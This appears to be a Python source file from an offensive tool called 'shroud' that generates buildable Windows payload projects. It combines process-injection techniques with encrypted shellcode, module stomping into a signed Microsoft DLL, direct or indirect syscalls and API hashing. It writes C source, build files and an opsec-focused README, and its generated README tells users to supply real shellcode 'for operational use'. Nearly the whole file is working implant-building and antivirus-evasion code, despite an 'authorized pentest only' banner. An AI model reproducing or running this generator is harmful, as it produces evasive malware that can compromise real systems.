"""
payload.py — assemble a technique + evasion stack into a buildable project.

Takes a resolved technique, the CLI parameters, and an evasion spec, then
writes a self-contained project directory (main.c, optional syscalls.S,
Makefile, build.sh, README) and optionally compiles it.
"""

import os
import secrets
import textwrap

from . import cstubs, evasion, shellcode, techniques


def _c_string(s: str) -> str:
    """Escape a Python string for embedding as a C string literal."""
    out = []
    for ch in s:
        if ch == "\\":
            out.append("\\\\")
        elif ch == '"':
            out.append('\\"')
        elif ch == "\n":
            out.append("\\n")
        elif 32 <= ord(ch) < 127:
            out.append(ch)
        else:
            out.append("\\x%02x" % ord(ch))
    return "".join(out)


def assemble(tech, *, params, flags, out_dir, fmt, build):
    """
    tech   : registry technique dict
    params : dict(target=, host=, dll=, shellcode=, demo=, xor_key=, rc4_key=)
    flags  : set of evasion tokens
    out_dir: output directory
    fmt    : 'exe' | 'dll' | 'c'
    build  : bool — compile after generating
    """
    body = techniques.build(tech, params)

    # ---- shellcode + encryption-at-rest ------------------------------------
    raw = shellcode.load(params.get("shellcode"), params.get("demo", True))
    crypto_kind, crypto_key, crypto_iv = None, None, None
    if "aes" in flags:
        crypto_kind = "aes"
        crypto_key = shellcode.parse_hex_key(params.get("aes_key"), default_len=32)
        crypto_iv = secrets.token_bytes(16)
        stored = shellcode.aes_encrypt(raw, crypto_key, crypto_iv)
    elif "rc4" in flags:
        crypto_kind = "rc4"
        crypto_key = shellcode.parse_hex_key(params.get("rc4_key"), default_len=16)
        stored = shellcode.rc4_crypt(raw, crypto_key)
    elif "xor" in flags:
        crypto_kind = "xor"
        crypto_key = shellcode.parse_hex_key(params.get("xor_key"), default_len=16)
        stored = shellcode.xor_bytes(raw, crypto_key)
    else:
        stored = raw
    sc_decl = shellcode.c_array(stored, name="sc")

    # stomp needs a target DLL; default to a large signed-by-Microsoft one
    stomp_dll = None
    if "stomp" in flags:
        stomp_dll = params.get("stomp_dll") or "xpsprint.dll"

    # ---- evasion stack ------------------------------------------------------
    ev = evasion.assemble(
        flags,
        api_names=body["api_names"],
        payload_base_expr="sc",
        payload_len_expr="sc_len",
        crypto_key=crypto_key,
        crypto_iv=crypto_iv,
        crypto_kind=crypto_kind,
        hash_algo=params.get("hash") or "fnv",
        stomp_dll=stomp_dll,
    )

    # ---- config globals -----------------------------------------------------
    config = []
    if body["needs_target"]:
        config.append('const char* g_target_name = "%s";'
                      % _c_string(params.get("target") or "explorer.exe"))
    if body["needs_host"]:
        config.append('const char* g_host_bin = "%s";'
                      % _c_string(params.get("host") or "notepad.exe"))
    if body["needs_dll"]:
        dll = params.get("dll")
        if not dll:
            raise ValueError("pe05 requires --dll <path-to-dll>")
        config.append('const char* g_dll_path = "%s";' % _c_string(dll))
    config.append("/* %s — %s [%s] */" % (tech["id"].upper(), tech["name"], tech["subtech"]))

    # ---- syscall block (if needed) -----------------------------------------
    syscall_c, syscall_ext = "", ""
    if body["needs_syscalls"]:
        syscall_c = cstubs.SYSCALLS_C + (
            "\nextern NTSTATUS DoDirectSyscall();\n"
            "extern NTSTATUS DoIndirectSyscall();\n"
        )
        syscall_ext = "direct" if tech["id"] == "pe24" else "indirect"

    # ---- compose main.c -----------------------------------------------------
    parts = [
        "/* Generated by shroud — authorized internal pentest use only. */",
        "/* Technique: %s — %s (%s) */" % (tech["id"], tech["name"], tech["category"]),
        "/* Evasion : %s */" % (", ".join(sorted(flags)) if flags else "none"),
        "",
        cstubs.HEADERS,
        "",
        "/* ===== staged payload%s ===== */" % (
            " (%s-encrypted; decrypted in place at runtime)" % crypto_kind if crypto_kind else ""),
        sc_decl,
        "",
        "/* ===== config ===== */",
        "\n".join(config),
        "",
        body["globals"],
        "",
        ev["code_pre"],
        "",
        ev["macros"],
        "",
        ev["code_post"],
        "",
        cstubs.HELPERS,
        "",
        syscall_c,
        "",
        "static DWORD payload_run(void) {",
        textwrap.indent(ev["init"], "    "),
        textwrap.indent(body["main"].strip("\n"), "    "),
        "    return 0;",
        "}",
        "",
    ]

    if fmt == "dll":
        parts.append(textwrap.dedent("""\
            BOOL WINAPI DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved) {
                (void)hInst; (void)reserved;
                if (reason == DLL_PROCESS_ATTACH) {
                    HANDLE t = CreateThread(NULL, 0,
                        (LPTHREAD_START_ROUTINE)payload_run, NULL, 0, NULL);
                    if (t) CloseHandle(t);
                }
                return TRUE;
            }
        """))
    else:  # exe
        parts.append(textwrap.dedent("""\
            int main(void) {
                payload_run();
                return 0;
            }
        """))

    main_c = "\n".join(parts)

    # ---- write project ------------------------------------------------------
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "main.c"), "w") as fh:
        fh.write(main_c)

    files = ["main.c"]
    if body["needs_syscalls"]:
        with open(os.path.join(out_dir, "syscalls.S"), "w") as fh:
            fh.write(cstubs.SYSCALLS_ASM)
        files.append("syscalls.S")

    _write_build_files(out_dir, tech, fmt, files, flags, syscall_ext, crypto_kind)
    _write_readme(out_dir, tech, body, flags, fmt, params, crypto_kind,
                  raw_len=len(raw), is_demo=params.get("demo", True) and not params.get("shellcode"))

    built = None
    if build and fmt != "c":
        from . import builder
        built = builder.build(out_dir, fmt=fmt)
    return {"dir": out_dir, "files": files, "main_c": main_c, "built": built,
            "syscall_mode": syscall_ext, "crypto": crypto_kind}


def _write_build_files(out_dir, tech, fmt, files, flags, syscall_ext, crypto_kind):
    cc = "x86_64-w64-mingw32-gcc"
    cflags = "-Wall -O2 -s -std=gnu11"
    ldflags = "-lkernel32"
    if fmt == "dll":
        ldflags = "-shared -lkernel32"
    out_name = "%s_%s" % (tech["id"], fmt)

    objs = " ".join(os.path.splitext(f)[0] + ".o" for f in files)
    body = []
    body.append("# shroud build file — %s/%s" % (tech["id"], fmt))
    body.append("CC      = %s" % cc)
    body.append("CFLAGS  = %s" % cflags)
    body.append("LDFLAGS = %s" % ldflags)
    body.append("OBJS    = %s" % objs)
    body.append("OUT     = %s.%s" % (out_name, "exe" if fmt == "exe" else "dll"))
    body.append("")
    body.append("all: $(OUT)")
    body.append("")
    for f in files:
        stem = os.path.splitext(f)[0]
        if f.endswith(".S"):
            body.append("%s.o: %s" % (stem, f))
            body.append("\t$(CC) $(CFLAGS) -c $< -o $@")
        else:
            body.append("%s.o: %s" % (stem, f))
            body.append("\t$(CC) $(CFLAGS) -c $< -o $@")
        body.append("")
    body.append("$(OUT): $(OBJS)")
    body.append("\t$(CC) $(OBJS) -o $@ $(LDFLAGS)")
    body.append("")
    body.append("clean:")
    body.append("\trm -f $(OBJS) $(OUT)")
    with open(os.path.join(out_dir, "Makefile"), "w") as fh:
        fh.write("\n".join(body))

    # build.sh — convenience one-liner
    with open(os.path.join(out_dir, "build.sh"), "w") as fh:
        fh.write("#!/usr/bin/env bash\nset -euo pipefail\n%s %s -o %s %s\n"
                 % (cc, " ".join(files), out_name + (".exe" if fmt == "exe" else ".dll"), ldflags))
    os.chmod(os.path.join(out_dir, "build.sh"), 0o755)


def _write_readme(out_dir, tech, body, flags, fmt, params, crypto_kind,
                  raw_len, is_demo):
    lines = []
    lines.append("# %s — %s" % (tech["id"].upper(), tech["name"]))
    lines.append("")
    lines.append("Category: **%s**   MITRE: **%s**" % (tech["category"], tech["subtech"]))
    lines.append("")
    lines.append(tech["summary"])
    lines.append("")
    lines.append("### Intended flow")
    for i, s in enumerate(tech["flow"], 1):
        lines.append("%d. %s" % (i, s))
    lines.append("")
    lines.append("### Evasion layers applied")
    if flags:
        for f in sorted(flags):
            lines.append("- `%s`" % f)
    else:
        lines.append("- _(none — bare technique)_")
    if crypto_kind:
        lines.append("")
        lines.append("Shellcode is stored %s-encrypted and decrypted in place at runtime." % crypto_kind)
    lines.append("")
    lines.append("### Opsec note")
    lines.append(body["note"])
    lines.append("")
    lines.append("### Build")
    lines.append("```")
    lines.append("make          # or ./build.sh")
    lines.append("```")
    lines.append("")
    lines.append("### Payload")
    if is_demo:
        lines.append("**WARNING: this project contains the DEMO stub (clean return) — supply real "
                     "shellcode with -s/--shellcode for operational use.**")
    lines.append("Staged bytes: %d (%s)" % (raw_len, "demo" if is_demo else "from --shellcode"))
    if body["needs_target"]:
        lines.append("Target process: `%s` (override with --process)" % (params.get("target") or "explorer.exe"))
    if body["needs_host"]:
        lines.append("Host binary: `%s` (override with --host)" % (params.get("host") or "notepad.exe"))
    lines.append("")
    lines.append("---")
    lines.append("Authorized internal pentest use only. You are responsible for scope and consent.")
    with open(os.path.join(out_dir, "README.md"), "w") as fh:
        fh.write("\n".join(lines))
